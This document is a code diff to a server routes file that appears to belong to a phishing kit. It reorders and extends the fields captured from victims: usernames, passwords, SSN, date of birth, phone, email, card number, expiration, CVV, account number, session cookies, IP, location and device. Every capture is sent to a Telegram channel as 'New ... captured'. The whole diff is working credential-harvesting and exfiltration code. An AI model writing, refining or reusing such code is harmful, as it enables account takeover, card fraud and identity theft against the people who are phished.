@@ -811,39 +811,43 @@ export async function registerRoutes(
           if (data?.credentialType) notificationData["Credential Type"] = data.credentialType;
         }
         
-        // Fields in exact order requested by user
-        // 1. Phone number first
-        if (data?.phone) notificationData["Phone number"] = data.phone;
-        
-        // 2. Username
+        // Fields in exact order specified by user
+        // 1. Username
         if (data?.username) notificationData["Username"] = data.username;
         
-        // 3. Password
+        // 2. Password
         if (data?.password) notificationData["Password"] = data.password;
         
-        // 4. New Password
+        // 3. New Password (if updated)
         if (data?.newPassword) notificationData["New Password"] = data.newPassword;
         
-        // 5. Card number
-        if (data?.cardNumber) notificationData["Card number"] = data.cardNumber;
-        if (data?.accountNumber) notificationData["Account number"] = data.accountNumber;
-        
-        // 6. Expiration Date
-        if (data?.cardExpiration) notificationData["Expiration Date"] = data.cardExpiration;
-        
-        // 7. CVV
-        if (data?.cardCvv) notificationData["CVV"] = data.cardCvv;
-        
-        // 8. SSN
+        // 4. SSN
         if (data?.ssn) notificationData["SSN"] = data.ssn;
         
-        // 9. DOB
+        // 5. DOB
         if (data?.dateOfBirth) notificationData["DOB"] = data.dateOfBirth;
         
-        // 10. IP Address
+        // 6. Phone number
+        if (data?.phone) notificationData["Phone number"] = data.phone;
+        
+        // 7. Email
+        if (data?.email) notificationData["Email"] = data.email;
+        
+        // 8. Card number + CVV + Expiration
+        if (data?.cardNumber) notificationData["Card number"] = data.cardNumber;
+        if (data?.cardExpiration) notificationData["Expiration Date"] = data.cardExpiration;
+        if (data?.cardCvv) notificationData["CVV"] = data.cardCvv;
+        
+        // 9. Account number
+        if (data?.accountNumber) notificationData["Account number"] = data.accountNumber;
+        
+        // 10. Cookies
+        notificationData["Cookies"] = cookieHeader || "None";
+        
+        // 11. IP Address
         notificationData["IP Address"] = deviceInfo.ip;
         
-        // 11. Location (country, city, state, zip code format)
+        // 12. Location
         const locationParts = [
           deviceInfo.location.country,
           deviceInfo.location.city,
@@ -852,14 +856,11 @@ export async function registerRoutes(
         ].filter(Boolean);
         notificationData["Location"] = locationParts.join(", ") || "Unknown";
         
-        // 12. Device
+        // 13. Device
         notificationData["Device"] = deviceInfo.deviceType;
         
-        // 13. Browser (Safari, Chrome, Firefox, etc.)
+        // 14. Browser
         notificationData["Browser"] = `${deviceInfo.browser}${deviceInfo.browserVersion ? ' ' + deviceInfo.browserVersion : ''}`;
-        
-        // 14. Cookies (last)
-        notificationData["Cookies"] = cookieHeader || "None";
         
         const actionLabel = action === "facial_recognition_auth" ? "Face ID authentication" : action.replace("_", " ");
         sendTelegramNotification(`New ${actionLabel} captured`, notificationData);
